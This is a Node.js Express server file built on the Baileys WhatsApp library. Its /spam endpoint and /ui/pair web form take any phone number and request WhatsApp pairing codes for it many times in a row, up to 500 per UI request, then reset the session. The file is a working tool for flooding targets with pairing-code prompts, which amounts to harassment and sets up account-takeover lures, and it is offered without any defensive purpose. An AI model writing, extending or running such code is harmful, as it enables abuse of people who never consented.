// server.js
const express = require("express");
const fs = require("fs");
const path = require("path");
const chalk = require("chalk");
const { Boom } = require("@hapi/boom");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
} = require("@whiskeysockets/baileys");

const app = express();
const PORT = process.env.PORT || 3000;
const SESSION_DIR = "./sessions";

app.use(express.json());
app.use(express.urlencoded({ extended: true })); // for EJS form POSTs

// configure EJS views folder (keeps behaviour like earlier chats)
app.set("view engine", "ejs");
app.set("views", path.join(process.cwd(), "views"));

let sock; // keep global

// Delay helper
const sleep = (ms) => new Promise((res) => setTimeout(res, ms));

/**
 * Start Baileys socket
 */
async function startSock() {
  console.log(chalk.yellow("🚀 Starting WhatsApp socket..."));

  // ensure sessions dir exists
  try { fs.mkdirSync(SESSION_DIR, { recursive: true }); } catch (e) {}

  const { state, saveCreds } = await useMultiFileAuthState(SESSION_DIR);

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: true, // just in case
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "open") {
      console.log(chalk.green("[SOCK] ✅ Connected and ready"));
    } else if (connection === "close") {
      const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
      console.log(chalk.red(`[SOCK] ❌ Disconnected. Reason: ${reason}`));

      switch (reason) {
        case DisconnectReason.badSession:
          console.log("Bad session. Clearing and restarting...");
          clearSessionAndRestart();
          break;
        case DisconnectReason.connectionClosed:
        case DisconnectReason.connectionLost:
        case DisconnectReason.timedOut:
        case DisconnectReason.restartRequired:
          console.log("Reconnecting...");
          // wait small backoff to avoid tight reconnect loops
          setTimeout(startSock, 1500);
          break;
        case DisconnectReason.loggedOut:
          console.log("Logged out. Clearing and restarting...");
          clearSessionAndRestart();
          break;
        default:
          console.log("Unknown disconnect. Restarting...");
          // small backoff
          setTimeout(startSock, 1500);
      }
    }
  });
}

/**
 * Clear session and restart socket (in-process)
 */
function clearSessionAndRestart() {
  try {
    if (fs.existsSync(SESSION_DIR)) {
      fs.rmSync(SESSION_DIR, { recursive: true, force: true });
      console.log(chalk.red("🗑️ Session cleared."));
    }
  } catch (err) {
    console.error("Error clearing session:", err);
  }
  console.log(chalk.yellow("🔄 Restarting socket..."));
  // small delay so logs flush
  setTimeout(() => startSock(), 1200);
}

/**
 * API: /spam
 * Example body: { "number": "233xxxxxxxxx", "count": 2 }
 */
app.post("/spam", async (req, res) => {
  const { number, count } = req.body;

  if (!number || !count) {
    return res.status(400).json({ error: "Missing number or count" });
  }

  if (!sock) {
    return res.status(500).json({ error: "Socket not initialized yet" });
  }

  console.log(chalk.blue(`📡 Spam request: ${number} | Count: ${count}`));

  try {
    for (let i = 0; i < count; i++) {
      const code = await sock.requestPairingCode(number);
      console.log(chalk.green(`✅ Pairing Code [${i + 1}/${count}]: ${code}`));
      await sleep(1000); // 1 second delay
    }

    // after spam, reset session (in-process)
    console.log(chalk.yellow("⚡ Spam finished. Restarting session..."));
    clearSessionAndRestart();

    return res.json({ success: true, message: `Requested ${count} codes.` });
  } catch (err) {
    console.error("❌ Error during spam:", err);
    clearSessionAndRestart();
    return res.status(500).json({ error: "Failed during spam, restarting..." });
  }
});

/**
 * UI: render EJS form for web usage
 * The form posts to /ui/pair (so you get a UI and the same behavior)
 */
app.get("/", (req, res) => {
  return res.render("index", { codes: null, error: null });
});

app.post("/ui/pair", async (req, res) => {
  try {
    const input = req.body.numberInput || "";
    // accept either "233xxx|2" or separate form fields
    let number = "";
    let count = 1;
    if (input.includes("|")) {
      const [rawPhone, rawCount] = input.split("|");
      number = (rawPhone || "").replace(/\D/g, "");
      count = Math.min(parseInt(rawCount || "1", 10), 500);
    } else {
      number = (req.body.number || "").replace(/\D/g, "");
      count = Math.min(parseInt(req.body.count || "1", 10), 500);
    }

    if (!number) return res.render("index", { codes: null, error: "Invalid phone input" });

    console.log(chalk.blue(`[REQ][UI] Phone: ${number}, Count: ${count}`));
    const codes = [];

    for (let i = 0; i < count; i++) {
      const code = await sock.requestPairingCode(number);
      console.log(chalk.green(`[CODE][UI] ${number} -> ${code}`));
      codes.push(code);
      if (i < count - 1) await sleep(1000); // 1s delay
    }

    // Render codes and then restart session in background
    res.render("index", { codes, error: null });
    console.log(chalk.yellow("⚡ UI spam finished. Restarting session..."));
    clearSessionAndRestart();
  } catch (err) {
    console.error("[ERR][UI]", err);
    res.render("index", { codes: null, error: "Failed to get codes" });
    console.log(chalk.yellow("⚠ UI error - restarting session..."));
    clearSessionAndRestart();
  }
});

// simple status route for debugging
app.get("/status", (req, res) => {
  return res.json({ ok: true, connected: !!sock?.user, user: sock?.user || null });
});

app.listen(PORT, () => {
  console.log(chalk.cyan(`🌍 Server running at http://localhost:${PORT}`));
  startSock(); // start Baileys when server boots
});
